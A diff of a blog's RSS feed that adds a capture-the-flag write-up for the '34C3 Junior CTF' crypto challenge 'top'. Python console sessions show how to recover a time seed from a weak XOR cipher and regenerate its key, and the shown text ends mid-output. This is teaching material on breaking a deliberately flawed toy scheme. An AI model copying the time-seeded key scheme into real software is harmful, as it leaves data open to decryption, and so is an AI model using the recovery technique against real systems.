@@ -7,8 +7,101 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
-        <title>34C4 Junior CTF - upload</title>
-        <description>&lt;p&gt;Today we’re going to look into one of the challenges from &lt;strong&gt;&lt;em&gt;34C4 Junior CTF&lt;/em&gt;&lt;/strong&gt;  called &lt;strong&gt;&lt;em&gt;upload&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+        <title>34C3 Junior CTF - top</title>
+        <description>&lt;p&gt;Let’s look at another challenge from &lt;strong&gt;&lt;em&gt;34C3 Junior CTF&lt;/em&gt;&lt;/strong&gt;  called &lt;strong&gt;&lt;em&gt;top&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Category: crypto&lt;/li&gt;
+  &lt;li&gt;Difficulty: easy&lt;/li&gt;
+  &lt;li&gt;Points: 49&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Perfectly secure. That's for sure! Or can break it and reveal my secret?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s take look at the source code provided in the challenge.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ASCII'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Your message: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ASCII'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Firstly, I’d like to analyze the code by recreating it with other variables. Let’s use python console for that.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ASCII'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Your message: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ASCII'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C3_This_i5_our_Flag_forma7_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I’m using one of the flags provided in the &lt;strong&gt;&lt;em&gt;faq&lt;/em&gt;&lt;/strong&gt; section. Now we can check what happens during the encryption process. Firstly, &lt;code class=&quot;highlighter-rouge&quot;&gt;cur_time&lt;/code&gt; variable is appended to the msg, which is our flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'34C3_This_i5_our_Flag_forma7_:)1514571090.8714993'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then &lt;code class=&quot;highlighter-rouge&quot;&gt;0x88&lt;/code&gt; value is being multiplied by the length of &lt;code class=&quot;highlighter-rouge&quot;&gt;cur_time&lt;/code&gt; variable.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x88]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;len&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cur_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After that we’re ready to show the actual encryption process.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; list&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zip&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg + cur_time, key + &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x88]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;len&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cur_time&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[(&lt;/span&gt;51, 180&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;52, 38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;67, 206&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51, 125&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95, 113&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84, 121&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;104, 104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;105, 88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;115, 30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95, 188&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;105, 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53, 32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95, 177&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;111, 24&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;117, 18&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;114, 186&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95, 102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;70, 123&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;108, 225&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;97, 68&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;103, 173&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95, 140&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;102, 135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;111, 173&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;114, 229&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;109, 232&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;97, 25&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;55, 101&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95, 52&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;58, 125&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;41, 216&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;52, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;55, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;57, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;46, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;56, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;55, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;52, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;57, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;57, 136&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51, 136&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;m ^ k &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;m,k &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;zip&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg + cur_time, key + &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x88]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;len&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cur_time&lt;span class=&quot;o&quot;&gt;))]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;135, 18, 141, 78, 46, 45, 0, 49, 109, 227, 118, 21, 238, 119, 103, 200, 57, 61, 141, 37, 202, 211, 225, 194, 151, 133, 120, 82, 107, 71, 241, 185, 189, 185, 188, 189, 191, 185, 184, 177, 184, 166, 176, 191, 185, 188, 177, 177, 187]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The most important flaw of this script is that we are able to get the &lt;code class=&quot;highlighter-rouge&quot;&gt;cur_time&lt;/code&gt; variable by &lt;strong&gt;&lt;em&gt;xoring&lt;/em&gt;&lt;/strong&gt; last &lt;strong&gt;&lt;em&gt;n&lt;/em&gt;&lt;/strong&gt; elements of the encrypted message. We know the key used with this, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x88&lt;/code&gt; so let’s reverse this scheme.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;B9 BD B9 BB BF B9 B1 B9 BB BB A6 B0 BF BA B0 BF BD BA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;These is encrypted part of a message that should represent &lt;code class=&quot;highlighter-rouge&quot;&gt;cur_time&lt;/code&gt; variable.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'5'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After completing the process for whole message, we get the &lt;code class=&quot;highlighter-rouge&quot;&gt;cur_time&lt;/code&gt; - which is &lt;code class=&quot;highlighter-rouge&quot;&gt;1513719133.8728752&lt;/code&gt;. Now as we know whis value, and random number generator is seeded with this value, we can generate the same numbers as during the generation of the key for the challenge.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1513719133.8728752&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ASCII'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;202&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;208&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;169&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;229&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;247&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;145&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 